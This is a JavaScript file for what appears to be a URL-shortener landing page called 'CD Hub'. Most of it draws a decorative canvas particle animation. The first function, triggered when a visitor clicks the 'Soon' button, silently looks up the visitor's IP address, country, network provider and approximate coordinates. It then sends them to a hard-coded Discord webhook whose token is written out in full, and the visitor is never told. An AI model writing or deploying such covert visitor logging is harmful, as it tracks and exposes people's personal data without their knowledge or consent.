// Function to send user info to Discord Webhook
async function sendUserInfoToWebhook() {
  // Fetching IP and location data from the API
  const response = await fetch('https://ipapi.co/json/');
  const data = await response.json();

  // Creating embed structure for the message
  const embed = {
    title: "New User Info",    // Embed title
    description: "User info collected from the website visit.",  // Embed description
    color: 0x32CD32,           // Embed color (green)
    fields: [
      { name: "IP Address", value: data.ip, inline: true },
      { name: "Country", value: data.country_name, inline: true },
      { name: "Provider", value: data.org, inline: true },
      { name: "Latitude", value: data.latitude || 'N/A', inline: true },
      { name: "Longitude", value: data.longitude || 'N/A', inline: true }
    ],
    footer: {
      text: "CD Hub - URL Shortener"  // Footer text
    }
  };

  // Replace with your actual Webhook URL
  const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo';

  // Send the embed message to the webhook
  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ embeds: [embed] }),  // Sending the embed JSON
  });
}

// Wait for the page to load completely
window.onload = () => {
  // Select the "Soon" button and add event listener
  const soonButton = document.querySelector('.btn');
  soonButton.addEventListener('click', (event) => {
    // Prevent default anchor behavior
    event.preventDefault();
    // Call the function to send info when the "Soon" button is clicked
    sendUserInfoToWebhook();
  });
};

const canvas = document.getElementById('particles');
const ctx = canvas.getContext('2d');

// Ajustar tamaño del lienzo
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const particlesArray = [];
const numberOfParticles = 100;

// Crear partículas
class Particle {
  constructor() {
    this.x = Math.random() * canvas.width;
    this.y = Math.random() * canvas.height;
    this.size = Math.random() * 5 + 1;
    this.speedX = Math.random() * 3 - 1.5;
    this.speedY = Math.random() * 3 - 1.5;
  }

  update() {
    this.x += this.speedX;
    this.y += this.speedY;

    // Reposicionar partículas fuera del lienzo
    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
  }

  draw() {
    ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    ctx.closePath();
    ctx.fill();
  }
}

// Inicializar partículas
function init() {
  for (let i = 0; i < numberOfParticles; i++) {
    particlesArray.push(new Particle());
  }
}

// Animar partículas
function animate() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  particlesArray.forEach(particle => {
    particle.update();
    particle.draw();
  });
  requestAnimationFrame(animate);
}

init();
animate();

// Actualizar el tamaño del lienzo al cambiar el tamaño de la ventana
window.addEventListener('resize', () => {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  particlesArray.length = 0;
  init();
});
